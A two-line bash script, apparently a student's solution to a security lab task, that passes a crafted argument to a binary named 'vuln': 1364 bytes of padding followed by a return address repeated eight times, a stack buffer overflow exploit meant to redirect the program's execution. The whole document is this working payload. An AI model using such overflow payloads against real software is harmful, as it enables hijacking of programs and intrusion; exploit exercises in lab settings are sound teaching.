#!/usr/bin/env bash
/task2/s1808795/vuln "$(echo -en `python3 -c "print('a' * 1364  + r'\\xc6\\x91\\x04\\x08' * 8)"`)"

